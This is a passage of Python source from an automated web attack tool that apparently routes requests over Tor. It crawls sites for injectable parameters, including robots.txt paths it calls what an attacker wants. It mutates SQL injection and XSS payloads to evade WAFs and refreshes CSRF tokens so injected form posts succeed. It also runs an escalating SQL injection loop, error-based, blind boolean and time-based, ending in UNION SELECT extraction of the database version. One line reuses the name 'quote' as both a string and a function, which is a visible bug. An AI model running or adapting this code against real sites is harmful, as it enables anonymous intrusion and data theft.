    def __init__(self, session: TorSession):
        self._session = session
        self._page_params: List[str] = []
        self._page_forms: List[dict] = []
        self._crawled_urls: List[dict] = []

    def extract_params_from_html(self, html: str, base_url: str):
        """Extract real parameter names from forms, links, and scripts on the page.

        This is what makes the scanner targeted instead of blind — we test
        params that actually exist on the target, not generic guesses.
        """
        params: Set[str] = set()
        forms: List[dict] = []

        # Extract from URL query strings in links
        url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{0,30})=', html[:100000])
        params.update(p.lower() for p in url_params)

        # Extract from HTML forms
        if HAS_BS4:
            try:
                soup = BeautifulSoup(html[:100000], "html.parser")
                for form in soup.find_all("form"):
                    form_data = {
                        "action": form.get("action", ""),
                        "method": (form.get("method", "GET")).upper(),
                        "params": [],
                    }
                    for inp in form.find_all(["input", "select", "textarea"]):
                        name = inp.get("name", "")
                        if name and not name.startswith("_"):
                            form_data["params"].append(name)
                            params.add(name.lower())
                    if form_data["params"]:
                        forms.append(form_data)
            except Exception:
                pass

        # Extract from JavaScript variable assignments and AJAX calls
        js_params = re.findall(
            r'(?:data|params|query)\s*[\[.]\s*["\']([a-zA-Z_]\w{0,30})["\']',
            html[:50000]
        )
        params.update(p.lower() for p in js_params)

        self._page_params = list(params)[:30]
        self._page_forms = forms[:10]

    def _get_test_params(self, fallback: List[str]) -> List[str]:
        """Get params to test: prefer real page params, fall back to common ones."""
        if self._page_params:
            combined = list(self._page_params[:5])
            for fb in fallback:
                if fb not in combined:
                    combined.append(fb)
                if len(combined) >= 5:
                    break
            return combined
        return fallback[:5]

    # ── Payload Mutation Engine ────────────────────────────────────────────
    @staticmethod
    def _mutate_sqli(base_payload: str) -> List[str]:
        """Generate WAF-evasion variants of a SQLi payload.

        Real WAFs block 'OR 1=1' but pass 'OR/**/1=1' or 'oR 1=1'.
        This produces variants with case mutation, inline comments,
        encoding tricks, and whitespace substitution.
        """
        variants = [base_payload]

        # Case mutations on SQL keywords
        keywords = ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE",
                    "NULL", "SLEEP", "WAITFOR", "DELAY", "BENCHMARK"]
        mutated = base_payload
        for kw in keywords:
            if kw.upper() in base_payload.upper():
                # Mixed case
                mixed = "".join(c.upper() if i % 2 else c.lower()
                                for i, c in enumerate(kw))
                v1 = re.sub(re.escape(kw), mixed, base_payload, flags=re.I)
                if v1 != base_payload:
                    variants.append(v1)
                # Inline comment
                commented = kw[0] + "/**/" + kw[1:]
                v2 = re.sub(re.escape(kw), commented, base_payload, flags=re.I)
                if v2 != base_payload:
                    variants.append(v2)

        # Whitespace → inline comment substitution
        v3 = base_payload.replace(" ", "/**/")
        if v3 != base_payload:
            variants.append(v3)

        # Tab substitution
        v4 = base_payload.replace(" ", "\t")
        if v4 != base_payload:
            variants.append(v4)

        # Double URL encoding of quotes
        v5 = base_payload.replace("'", "%2527")
        if v5 != base_payload:
            variants.append(v5)

        return variants[:6]

    @staticmethod
    def _mutate_xss(base_payload: str) -> List[str]:
        """Generate filter-evasion variants of XSS payloads."""
        variants = [base_payload]

        # Case mutation on tags
        v1 = base_payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>")
        if v1 != base_payload:
            variants.append(v1)

        # Using event handlers instead of script tags
        if "<script>" in base_payload.lower():
            canary = re.search(r">(.*?)<", base_payload)
            if canary:
                c = canary.group(1)
                variants.append(f'<img src=x onerror="{c}">')
                variants.append(f'<svg/onload="{c}">')
                variants.append(f'<body onload="{c}">')
                variants.append(f'<details open ontoggle="{c}">')

        # HTML entity encoding
        v2 = base_payload.replace("<", "&#60;").replace(">", "&#62;")
        if v2 != base_payload:
            variants.append(v2)

        # Null byte insertion (bypasses some PHP filters)
        v3 = base_payload.replace("<", "%00<")
        if v3 != base_payload:
            variants.append(v3)

        return variants[:6]

    # ── Response Diffing ───────────────────────────────────────────────────
    @staticmethod
    def _response_diff(baseline: str, test: str) -> dict:
        """Structural diff between two HTML responses.

        Goes beyond simple length comparison: checks content similarity,
        keyword changes, and structural differences.
        """
        if not baseline or not test:
            return {"similar": False, "score": 0.0}

        bl = baseline[:10000]
        tl = test[:10000]

        len_ratio = min(len(bl), len(tl)) / max(len(bl), len(tl), 1)

        # Word-level similarity (fast Jaccard-like)
        bl_words = set(bl.lower().split())
        tl_words = set(tl.lower().split())
        if bl_words or tl_words:
            common = bl_words & tl_words
            total = bl_words | tl_words
            word_sim = len(common) / len(total) if total else 0
        else:
            word_sim = 1.0

        # Key structural elements (title, h1, form count)
        def _extract_structure(html):
            titles = re.findall(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
            h1s = re.findall(r"<h1[^>]*>(.*?)</h1>", html, re.I | re.S)
            forms = len(re.findall(r"<form", html, re.I))
            return (titles[0][:50] if titles else "", h1s[0][:50] if h1s else "", forms)

        s1 = _extract_structure(bl)
        s2 = _extract_structure(tl)
        struct_same = s1 == s2

        score = (len_ratio * 0.3 + word_sim * 0.5 + (1.0 if struct_same else 0.0) * 0.2)

        return {
            "similar": score > 0.85,
            "score": round(score, 3),
            "len_ratio": round(len_ratio, 3),
            "word_sim": round(word_sim, 3),
            "struct_same": struct_same,
        }

    # ── JS Endpoint Extraction ─────────────────────────────────────────────
    @staticmethod
    def _extract_js_endpoints(html: str, base_url: str) -> List[str]:
        """Extract API endpoints from JavaScript in HTML.

        Catches fetch(), axios, XMLHttpRequest, and string-based URL patterns
        that the <a href> crawler misses entirely.
        """
        endpoints = set()
        domain = urlparse(base_url).netloc

        # fetch/axios/XHR URL patterns
        patterns = [
            re.compile(r'''fetch\s*\(\s*['"]([^'"]+)['"]''', re.I),
            re.compile(r'''axios\s*\.\w+\s*\(\s*['"]([^'"]+)['"]''', re.I),
            re.compile(r'''\.open\s*\(\s*['"][A-Z]+['"]\s*,\s*['"]([^'"]+)['"]''', re.I),
            re.compile(r'''url\s*[:=]\s*['"]([^'"]*(?:api|ajax|action|endpoint|query|search)[^'"]*)['"]''', re.I),
            re.compile(r'''['"](/(?:api|v[0-9]|ajax|rest|graphql|ws)/[^'"]{2,60})['"]'''),
            re.compile(r'''['"]([^'"]+\.(?:php|asp|aspx|jsp|cgi|pl|py)(?:\?[^'"]*)?)['"]\s*'''),
            re.compile(r'''action\s*[:=]\s*['"]([^'"]+)['"]''', re.I),
        ]

        for pat in patterns:
            for match in pat.findall(html[:200000]):
                if match.startswith("http"):
                    # Match against the parsed netloc so
                    # example.com.evil.com / *evil-example.com don't
                    # count as same-origin just because they contain
                    # our domain as a substring.
                    try:
                        m_netloc = urlparse(match).netloc.lower()
                    except Exception:
                        continue
                    if m_netloc == domain or m_netloc.endswith("." + domain):
                        endpoints.add(match)
                elif match.startswith("/"):
                    endpoints.add(urljoin(base_url, match))
                elif not match.startswith(("#", "javascript:", "data:", "mailto:")):
                    endpoints.add(urljoin(base_url, match))

        return list(endpoints)[:30]

    # ── Parameter Profiler ─────────────────────────────────────────────────
    def _profile_param(self, endpoint: dict, param_name: str) -> dict:
        """Profile a parameter to understand its behavior before attacking.

        Sends 3 probe requests to determine:
        - type: int, string, empty-sensitive
        - reflected: whether input appears in the response body
        - reflection_context: where in the HTML it appears (tag, attribute, script, text)
        - error_sensitive: whether unusual input triggers errors
        - base_response_len: normal response length for comparison

        This is what separates a smart scanner from a dumb fuzzer.
        """
        url = endpoint["url"]
        profile = {
            "name": param_name,
            "type": "unknown",
            "reflected": False,
            "reflection_context": None,
            "error_sensitive": False,
            "base_response_len": 0,
            "base_status": 0,
        }

        # Probe 1: send a normal-looking value
        probe_val = "test123"
        resp = self._send_test(endpoint, param_name, probe_val)
        if not resp or not resp.text:
            return profile

        profile["base_response_len"] = len(resp.text)
        profile["base_status"] = resp.status_code
        base_text = resp.text

        # Check reflection: does our probe value appear in the response?
        if probe_val in resp.text:
            profile["reflected"] = True
            idx = resp.text.find(probe_val)
            context_before = resp.text[max(0, idx - 80):idx].lower()

            if "<script" in context_before and "</script>" not in context_before:
                profile["reflection_context"] = "script"
            elif re.search(r'(?:value|placeholder|title|alt|content)\s*=\s*["\'][^"\']*$', context_before):
                profile["reflection_context"] = "attribute"
            elif "<" in context_before and ">" not in context_before.split("<")[-1]:
                profile["reflection_context"] = "tag"
            else:
                profile["reflection_context"] = "text"

        # Probe 2: send a numeric value to detect type
        resp2 = self._send_test(endpoint, param_name, "1")
        if resp2:
            resp3 = self._send_test(endpoint, param_name, "99999")
            if resp3:
                diff = self._response_diff(resp2.text, resp3.text)
                if not diff["similar"]:
                    profile["type"] = "int"
                else:
                    profile["type"] = "string"
            if resp2.status_code != resp.status_code:
                profile["type"] = "int"

        # Probe 3: send a special character to see if error-sensitive
        resp_err = self._send_test(endpoint, param_name, "';\"\\")
        if resp_err:
            if resp_err.status_code >= 500:
                profile["error_sensitive"] = True
            elif resp_err.status_code != profile["base_status"]:
                profile["error_sensitive"] = True
            elif resp_err.text:
                # Check for error keywords not in baseline
                error_kw = ["error", "exception", "warning", "fatal", "syntax",
                            "invalid", "unexpected", "parse"]
                err_count = sum(1 for kw in error_kw if kw in resp_err.text.lower()[:3000])
                base_count = sum(1 for kw in error_kw if kw in base_text.lower()[:3000])
                if err_count > base_count + 1:
                    profile["error_sensitive"] = True

        return profile

    def crawl_for_endpoints(self, base_url: str, html: str, depth: int = 1) -> List[dict]:
        """Crawl the site to discover testable endpoints (URLs with params + forms).

        This is what makes the difference between a useless scanner and one
        that actually finds vulns: real applications have vulns at specific
        paths like /search.php?q=, /user.php?id=, not at the homepage.

        Returns list of {url, params: [{name, value}], method, source}.
        """
        domain = urlparse(base_url).netloc
        endpoints: List[dict] = []
        seen_urls: Set[str] = set()
        pages_to_crawl: List[str] = [base_url]
        pages_crawled: Set[str] = set()

        if not HAS_BS4:
            return endpoints

        def _extract_from_html(page_url: str, page_html: str):
            """Extract testable endpoints from a single page."""
            try:
                soup = BeautifulSoup(page_html[:200000], "html.parser")
            except Exception:
                return

            # Extract links with query parameters
            for tag in soup.find_all("a", href=True):
                href = tag.get("href", "")
                if not href or href.startswith(("#", "javascript:", "mailto:")):
                    continue
                full_url = urljoin(page_url, href)
                parsed = urlparse(full_url)

                if not parsed.scheme or not parsed.netloc:
                    continue
                if parsed.netloc != domain:
                    continue

                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if clean_url not in seen_urls:
                    seen_urls.add(clean_url)
                    # Queue for crawling if it looks like a page
                    if (parsed.path.endswith(('.php', '.asp', '.aspx', '.jsp', '.cgi',
                                              '.pl', '.py', '/', '.html', '.htm'))
                            or '.' not in parsed.path.split('/')[-1]):
                        pages_to_crawl.append(clean_url)

                # If the URL has query params, it's a testable endpoint
                if parsed.query:
                    params = parse_qs(parsed.query, keep_blank_values=True)
                    param_list = [{"name": k, "value": v[0] if v else ""}
                                  for k, v in params.items()]
                    if param_list:
                        endpoints.append({
                            "url": clean_url,
                            "params": param_list,
                            "method": "GET",
                            "source": "link",
                        })

            # Extract forms with their action URLs and input parameters
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = (form.get("method", "GET")).upper()
                form_url = urljoin(page_url, action) if action else page_url

                parsed = urlparse(form_url)
                if not parsed.scheme or not parsed.netloc:
                    parsed = urlparse(urljoin(page_url, form_url))
                if parsed.netloc and parsed.netloc != domain:
                    continue

                params = []
                for inp in form.find_all(["input", "select", "textarea"]):
                    name = inp.get("name", "")
                    if not name:
                        continue
                    itype = inp.get("type", "text").lower()
                    if itype in ("submit", "button", "image", "reset"):
                        continue
                    value = inp.get("value", "")
                    is_hidden = (itype == "hidden")
                    params.append({"name": name, "value": value,
                                   "hidden": is_hidden, "type": itype})

                if params:
                    endpoints.append({
                        "url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        "params": params,
                        "method": method,
                        "source": "form",
                    })

        # Phase 0: extract JS endpoints (API routes the link crawler misses)
        js_urls = self._extract_js_endpoints(html, base_url)
        for js_url in js_urls:
            parsed = urlparse(js_url)
            if parsed.query:
                params = parse_qs(parsed.query, keep_blank_values=True)
                param_list = [{"name": k, "value": v[0] if v else "", "hidden": False, "type": "text"}
                              for k, v in params.items()]
                if param_list:
                    endpoints.append({
                        "url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        "params": param_list,
                        "method": "GET",
                        "source": "javascript",
                    })
            clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if clean not in seen_urls:
                seen_urls.add(clean)
                pages_to_crawl.append(clean)

        # Phase 1: extract from the initial page HTML
        _extract_from_html(base_url, html)

        # Phase 1b: seed pages_to_crawl with robots.txt disallow entries
        # and sitemap.xml URLs. These are the two most effective crawl
        # extensions — operators who hide admin paths in robots.txt give
        # away exactly the paths an attacker wants.
        #
        # Both caps are intentional: a big e-commerce sitemap easily
        # contains 10 000+ product pages. We only want to probe a
        # structural sample, not enumerate the whole catalog.
        _MAX_ROBOTS_SEEDS = 30
        _MAX_SITEMAP_SEEDS = 20
        _MAX_SITEMAP_INDICES = 3  # sitemap indexes can point at dozens of sub-sitemaps
        sitemaps_queued: Set[str] = set()

        def _ingest_sitemap(sitemap_url: str, budget: int) -> int:
            """Fetch a sitemap and enqueue up to `budget` <loc> URLs.

            Returns the number of URLs added to pages_to_crawl.
            If the sitemap is actually a <sitemapindex>, queue up to
            _MAX_SITEMAP_INDICES sub-sitemaps for later processing
            (without recursing — we do BFS by returning and letting
            the outer loop keep budget-limited).
            """
            if budget <= 0 or sitemap_url in sitemaps_queued:
                return 0
            sitemaps_queued.add(sitemap_url)
            try:
                resp = self._session.get(sitemap_url, allow_wayback=False)
            except Exception:
                return 0
            if not resp or resp.status_code != 200 or not resp.text:
                return 0
            body = resp.text[:500000]
            added = 0
            # Sitemap-of-sitemaps: queue the inner sitemaps (bounded).
            if "<sitemapindex" in body[:2000].lower():
                idx_urls = re.findall(
                    r"<loc>\s*(https?://[^<\s]+)\s*</loc>", body, re.I,
                )[:_MAX_SITEMAP_INDICES]
                # Filter to same-origin
                for sub in idx_urls:
                    if urlparse(sub).netloc == domain:
                        inner = _ingest_sitemap(sub, budget - added)
                        added += inner
                        if added >= budget:
                            break
                return added
            # Regular sitemap
            for m in re.findall(
                r"<loc>\s*(https?://[^<\s]+)\s*</loc>", body, re.I,
            ):
                if added >= budget:
                    break
                if urlparse(m).netloc != domain:
                    continue
                if m in seen_urls:
                    continue
                seen_urls.add(m)
                pages_to_crawl.append(m)
                added += 1
            return added

        try:
            rob_url = urljoin(base_url, "/robots.txt")
            rob_resp = self._session.get(rob_url, allow_wayback=False)
            if rob_resp and rob_resp.status_code == 200 and rob_resp.text:
                seeds_from_robots = 0
                for line in rob_resp.text[:30000].splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    lline = line.lower()
                    # Both Disallow and Allow leak structure — crawl either.
                    matched_directive = False
                    for directive in ("disallow:", "allow:"):
                        if lline.startswith(directive):
                            matched_directive = True
                            if seeds_from_robots >= _MAX_ROBOTS_SEEDS:
                                break
                            val = line[len(directive):].strip()
                            if val and val != "/" and " " not in val:
                                # Skip wildcard-only disallows; they
                                # leak nothing structural.
                                if val.strip("*/").strip():
                                    full = urljoin(
                                        base_url,
                                        val.split("?")[0].split("#")[0],
                                    )
                                    p = urlparse(full)
                                    if (p.netloc == domain and
                                            full not in seen_urls):
                                        seen_urls.add(full)
                                        pages_to_crawl.append(full)
                                        seeds_from_robots += 1
                            break
                    if matched_directive:
                        continue
                    if lline.startswith("sitemap:"):
                        sm = line[len("sitemap:"):].strip()
                        if sm:
                            _ingest_sitemap(sm, _MAX_SITEMAP_SEEDS)
        except Exception as _rex:
            integrity_log("intel", f"robots_crawl_error:{type(_rex).__name__}")

        # Phase 1c: also try /sitemap.xml directly even if robots didn't
        # advertise it.
        try:
            sm_url = urljoin(base_url, "/sitemap.xml")
            _ingest_sitemap(sm_url, _MAX_SITEMAP_SEEDS)
        except Exception as _sex:
            integrity_log("intel", f"sitemap_crawl_error:{type(_sex).__name__}")

        # Phase 2: crawl discovered pages (1 level deep, max 25 pages)
        max_crawl = 25
        crawled = 0
        while pages_to_crawl and crawled < max_crawl:
            if shutdown_requested():
                break
            if self._session.is_domain_blocked(domain):
                break
            page = pages_to_crawl.pop(0)
            if page in pages_crawled:
                continue
            pages_crawled.add(page)
            if page == base_url:
                continue  # Already have this HTML

            crawled += 1
            resp = self._session.get(page, allow_wayback=False)
            if resp and resp.status_code == 200 and resp.text:
                _extract_from_html(page, resp.text)

        # Deduplicate: same url+param combo
        seen_ep = set()
        unique = []
        for ep in endpoints:
            key = f"{ep['method']}:{ep['url']}:{','.join(p['name'] for p in ep['params'])}"
            if key not in seen_ep:
                seen_ep.add(key)
                unique.append(ep)

        self._crawled_urls = unique[:50]
        return self._crawled_urls

    def _build_request_data(self, endpoint: dict, target_param: str, value: str) -> dict:
        """Build complete form data, injecting value into target_param
        while preserving all other params (hidden fields, tokens, etc.)."""
        data = {}
        for p in endpoint.get("params", []):
            if p["name"] == target_param:
                data[p["name"]] = value
            else:
                data[p["name"]] = p.get("value", "")
        if target_param not in data:
            data[target_param] = value
        return data

    def _fetch_live_form(self, endpoint: dict) -> Optional[dict]:
        """Visit the page and parse the LIVE form to get fresh hidden values.

        Static endpoints from crawling have stale CSRF tokens and hidden
        field values. This fetches the page, finds the matching form, and
        returns fresh field values. Without this, POST requests to forms
        with CSRF protection silently fail (302 back to login or 403).
        """
        url = endpoint["url"]
        if endpoint.get("source") != "form" or endpoint["method"] != "POST":
            return None

        resp = self._session.get(url, allow_wayback=False)
        if not resp or not resp.text or not HAS_BS4:
            return None

        try:
            soup = BeautifulSoup(resp.text[:200000], "html.parser")
            # Find the form — match by action URL or by containing our target params
            ep_param_names = {p["name"] for p in endpoint["params"]}
            best_form = None

            for form in soup.find_all("form"):
                form_params = {inp.get("name", "") for inp in form.find_all(["input", "select", "textarea"])
                               if inp.get("name")}
                overlap = ep_param_names & form_params
                if overlap:
                    best_form = form
                    break

            if not best_form:
                return None

            # Extract ALL fields from the live form (fresh tokens)
            fresh_params = []
            for inp in best_form.find_all(["input", "select", "textarea"]):
                name = inp.get("name", "")
                if not name:
                    continue
                itype = inp.get("type", "text").lower()
                if itype in ("submit", "button", "image", "reset"):
                    continue
                value = inp.get("value", "")
                fresh_params.append({
                    "name": name,
                    "value": value,
                    "hidden": (itype == "hidden"),
                    "type": itype,
                })

            # Update endpoint action URL from the live form
            action = best_form.get("action", "")
            if action:
                fresh_url = urljoin(url, action)
            else:
                fresh_url = url

            return {
                "url": fresh_url,
                "params": fresh_params,
                "method": (best_form.get("method", "POST")).upper(),
                "source": "live_form",
            }

        except Exception:
            return None

    def _send_test(self, endpoint: dict, param_name: str, value: str,
                   follow_redirects: bool = True) -> Optional[requests.Response]:
        """Send a test request with full lifecycle:
        1. For POST forms: fetch live page first to get fresh tokens
        2. Build request data with all fields filled
        3. Send request
        4. Follow redirects to get the final response
        """
        url = endpoint["url"]

        # For POST endpoints, refresh form data to get live tokens
        live = endpoint
        if endpoint["method"] == "POST" and endpoint.get("source") != "live_form":
            if not hasattr(self, '_live_form_cache'):
                self._live_form_cache = {}
            cache_key = endpoint["url"]
            # Refresh form if it has hidden token fields (CSRF) or if not cached
            has_token = any(p.get("hidden") and p["name"].lower() in
                           ("csrf", "token", "_token", "csrfmiddlewaretoken", "nonce",
                            "__requestverificationtoken", "csrf_token", "authenticity_token")
                           for p in endpoint.get("params", []))
            if cache_key not in self._live_form_cache or has_token:
                fresh = self._fetch_live_form(endpoint)
                if fresh:
                    self._live_form_cache[cache_key] = fresh
            cached = self._live_form_cache.get(cache_key)
            if cached:
                live = cached

        data = self._build_request_data(live, param_name, value)

        if live["method"] == "GET":
            qs = urlencode(data)
            # Endpoints from crawl_for_endpoints strip the query string,
            # but a 'fallback' endpoint can still carry base_url with a
            # pre-existing query. Use '&' to merge instead of '?' so we
            # don't produce 'foo.com/?a=1?b=2' which the server will
            # reject.
            sep = "&" if ("?" in live["url"]) else "?"
            return self._session.get(f"{live['url']}{sep}{qs}", allow_wayback=False)
        else:
            resp = self._session.post_form(live["url"], data)
            # Follow redirect to see the actual result page
            if follow_redirects and resp and resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get("Location", "")
                if location:
                    redirect_url = urljoin(live["url"], location)
                    resp = self._session.get(redirect_url, allow_wayback=False)
            return resp

    # ── Parameter Scoring ─────────────────────────────────────────────────
    def _score_param(self, profile: dict) -> int:
        """Score a parameter to decide how deep to test it.
        High score = more payloads, mutations, and time-based checks.
        Low score = quick probe and move on."""
        score = 0
        if profile.get("reflected"):
            score += 3
        if profile.get("error_sensitive"):
            score += 4
        if profile.get("reflection_context") in ("attribute", "script"):
            score += 2
        if profile.get("type") == "int":
            score += 1
        # High-value param names
        name = profile.get("name", "").lower()
        if any(kw in name for kw in ("search", "query", "q", "id", "user", "name",
                                      "page", "file", "path", "url", "cmd", "exec",
                                      "sort", "order", "filter", "cat", "item", "title")):
            score += 2
        # Low-value param names
        if any(kw in name for kw in ("utm_", "ref", "lang", "locale", "theme",
                                      "callback", "format", "width", "height")):
            score -= 3
        return max(score, 0)

    # ── Attack Loop Engine ─────────────────────────────────────────────────
    def _attack_sqli(self, endpoint: dict, pname: str, pval: str,
                     profile: dict, depth: int) -> List[dict]:
        """Adaptive SQLi attack loop. Probes, analyzes, adapts, escalates.

        depth controls how many attempts:
          shallow (0-3): 3 quick probes
          medium  (4-6): full error-based + blind boolean
          deep    (7+):  + time-based + mutations + extraction
        """
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        findings = []

        baseline_resp = self._send_test(endpoint, pname, pval)
        if not baseline_resp or not baseline_resp.text:
            return findings
        baseline_text = baseline_resp.text[:8000]

        # ── Stage 1: Quick probe (always runs) ─────────────────────────
        quote = "" if profile.get("type") == "int" else "'"
        probe = self._send_test(endpoint, pname, f"{pval}{quote}")
        if not probe or not probe.text:
            return findings

        # Check for ANY SQL error indicator
        sql_error_found = False
        matched_indicator = None
        for ind in self.SQLI_INDICATORS:
            if ind.search(probe.text[:8000]) and not ind.search(baseline_text):
                sql_error_found = True
                matched_indicator = ind
                break

        # Also check: did the response change significantly?
        probe_diff = self._response_diff(baseline_text, probe.text)
        response_changed = not probe_diff["similar"]

        if not sql_error_found and not response_changed and depth < 4:
            return findings  # Shallow test: nothing interesting, move on

        # ── Stage 2: Error-based (if error detected or medium+ depth) ──
        if sql_error_found or depth >= 4:
            if profile.get("type") == "int":
                payloads = [
                    f"{pval} OR 1=1-- -", f"{pval} AND 1=2-- -",
                    f"{pval} UNION SELECT NULL-- -",
                    f"{pval} UNION SELECT NULL,NULL-- -",
                    f"{pval} UNION SELECT NULL,NULL,NULL-- -",
                    f"{pval} UNION SELECT NULL,NULL,NULL,NULL-- -",
                    f"{pval} UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
                    f"{pval} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
                ]
            else:
                payloads = [
                    f"{pval}' OR '1'='1'-- -", f"{pval}' AND '1'='2'-- -",
                    f"{pval}' UNION SELECT NULL-- -",
                    f"{pval}' UNION SELECT NULL,NULL-- -",
                    f"{pval}' UNION SELECT NULL,NULL,NULL-- -",
                    f"{pval}' UNION SELECT NULL,NULL,NULL,NULL-- -",
                    f"{pval}' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
                    f"{pval}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
                ]

            # Add mutations if deep
            all_payloads = list(payloads)
            if depth >= 7:
                for bp in payloads[:3]:
                    all_payloads.extend(self._mutate_sqli(bp))

            for payload in all_payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    break
                resp = self._send_test(endpoint, pname, payload)
                if not resp or not resp.text:
                    continue

                for ind in self.SQLI_INDICATORS:
                    if ind.search(resp.text[:8000]) and not ind.search(baseline_text):
                        # Confirmed error-based SQLi — try to extract data
                        extracted = self._sqli_extract(endpoint, pname, pval, profile)
                        test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
                        detail = f"SQL error from: {payload[:40]}"
                        if extracted:
                            detail += f". VERIFIED: {extracted}"

                        findings.append({
                            "severity": SEV_CRITICAL,
                            "title": f"SQL injection via '{pname}' at {path}",
                            "detail": detail,
                            "evidence": f"param: {pname}, payload: {payload[:40]}, "
                                        f"indicator: {ind.pattern[:40]}"
                                        + (f", {extracted}" if extracted else ""),
                            "exploitable": True,
                            "test_url": test_url,
                            "exploit_info": {
                                "type": "sqli", "parameter": pname, "path": path,
                                "method": f"Error-based SQLi at {path} via '{pname}'."
                                          + (f" {extracted}" if extracted else ""),
                                "risk": "Full database access, data exfiltration, potential RCE",
                            },
                        })
                        return findings

        # ── Stage 3: Blind boolean (if response changed or medium+ depth) ──
        if (response_changed or depth >= 4) and not findings:
            if profile.get("type") == "int":
                true_val, false_val = f"{pval} AND 1=1", f"{pval} AND 1=2"
            else:
                true_val = f"{pval}' AND '1'='1"
                false_val = f"{pval}' AND '1'='2"

            true_resp = self._send_test(endpoint, pname, true_val)
            false_resp = self._send_test(endpoint, pname, false_val)
            if true_resp and false_resp and true_resp.text and false_resp.text:
                true_diff = self._response_diff(baseline_text, true_resp.text)
                false_diff = self._response_diff(baseline_text, false_resp.text)

                if true_diff["similar"] and not false_diff["similar"]:
                    test_url = f"{url}?{pname}={quote(true_val)}" if endpoint.get("method") == "GET" else url
                    findings.append({
                        "severity": SEV_CRITICAL,
                        "title": f"Blind SQLi via '{pname}' at {path}",
                        "detail": f"Boolean condition changes response. "
                                  f"true_sim={true_diff['score']}, false_sim={false_diff['score']}",
                        "evidence": f"param: {pname}, "
                                    f"true={true_diff['score']}, false={false_diff['score']}",
                        "exploitable": True, "test_url": test_url,
                        "exploit_info": {
                            "type": "sqli", "parameter": pname, "path": path,
                            "method": f"Blind boolean SQLi via '{pname}'.",
                            "risk": "Database extraction via boolean inference",
                        },
                    })
                    return findings

        # ── Stage 4: Time-based blind (deep only) ──────────────────────
        if depth >= 7 and not findings:
            times = []
            for _ in range(2):
                t0 = time.time()
                self._send_test(endpoint, pname, pval)
                times.append(time.time() - t0)
            bt = sum(times) / len(times)
            bv = max(abs(t - bt) for t in times)
            threshold = bt + max(2.0, bv * 3)

            if profile.get("type") == "int":
                tp = [(f"{pval} AND SLEEP(3)-- -", "SLEEP"),
                      (f"{pval} AND (SELECT SLEEP(3))-- -", "subquery SLEEP"),
                      (f"{pval}; WAITFOR DELAY '0:0:3'-- -", "WAITFOR")]
            else:
                tp = [(f"{pval}' AND SLEEP(3)-- -", "SLEEP"),
                      (f"{pval}' AND (SELECT SLEEP(3))-- -", "subquery SLEEP"),
                      (f"{pval}'; WAITFOR DELAY '0:0:3'-- -", "WAITFOR")]

            for payload, desc in tp:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    break
                t0 = time.time()
                self._send_test(endpoint, pname, payload)
                e1 = time.time() - t0
                if e1 > threshold and e1 > bt + 2.0:
                    t0 = time.time()
                    self._send_test(endpoint, pname, payload)
                    e2 = time.time() - t0
                    if e2 > threshold and e2 > bt + 2.0:
                        test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
                        findings.append({
                            "severity": SEV_CRITICAL,
                            "title": f"Time-based blind SQLi via '{pname}' at {path}",
                            "detail": f"{desc}: baseline={bt:.1f}s, test={e1:.1f}s/{e2:.1f}s",
                            "evidence": f"param: {pname}, {desc}, {e1:.1f}s/{e2:.1f}s vs {bt:.1f}s",
                            "exploitable": True, "test_url": test_url,
                            "exploit_info": {
                                "type": "sqli", "parameter": pname, "path": path,
                                "method": f"Time-based blind SQLi via {desc}.",
                                "risk": "Database extraction via time-based inference",
                            },
                        })
                        return findings

        return findings

    def _sqli_extract(self, endpoint: dict, pname: str, pval: str,
                      profile: dict) -> str:
        """Try to extract DB version via UNION SELECT after confirming SQLi."""
        q = "" if profile.get("type") == "int" else "'"
        for cols in range(1, 8):
            nulls = ",".join(["NULL"] * cols)
            for pos in range(cols):
                parts = ["NULL"] * cols
                parts[pos] = "CONCAT(0x67733a,version(),0x3a7367)"
                union = ",".join(parts)
                payload = f"{pval}{q} UNION SELECT {union}-- -"
                resp = self._send_test(endpoint, pname, payload)
                if resp and resp.text:
                    m = re.search(r"gs:(.*?):sg", resp.text)
                    if m:
                        return f"DB version: {m.group(1)}"
        return ""

    def _test_endpoint_sqli(self, endpoint: dict) -> List[dict]:
        """Test endpoint for SQLi using the adaptive attack loop."""
        url = endpoint["url"]
        domain = urlparse(url).netloc
        if self._session.is_domain_blocked(domain):
            return []

        testable = [p for p in endpoint["params"] if not p.get("hidden")]
        if not testable:
            testable = endpoint["params"][:2]

        skip_names = {"csrf", "token", "_token", "csrfmiddlewaretoken", "nonce",
                      "__requestverificationtoken", "csrf_token", "authenticity_token"}
        findings = []

        for param_info in testable[:4]:
            if shutdown_requested() or self._session.is_domain_blocked(domain):
                break
            pname = param_info["name"]
            if pname.lower() in skip_names:
                continue
            pval = param_info.get("value", "") or "1"

            profile = self._profile_param(endpoint, pname)
            score = self._score_param(profile)

            # Depth determines how many techniques to try
            if score >= 7:
                depth = 10   # deep: all techniques + mutations + time-based
            elif score >= 4:
                depth = 6    # medium: error-based + blind boolean
            else:
                depth = 2    # shallow: quick probe only

            result = self._attack_sqli(endpoint, pname, pval, profile, depth)
            if result:
                findings.extend(result)
                return findings

        return findings

    def _test_endpoint_xss(self, endpoint: dict) -> List[dict]:
        """Test for reflected XSS across multiple injection contexts."""
        findings = []
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        if self._session.is_domain_blocked(domain):
            return findings

        testable = [p for p in endpoint["params"] if not p.get("hidden")]
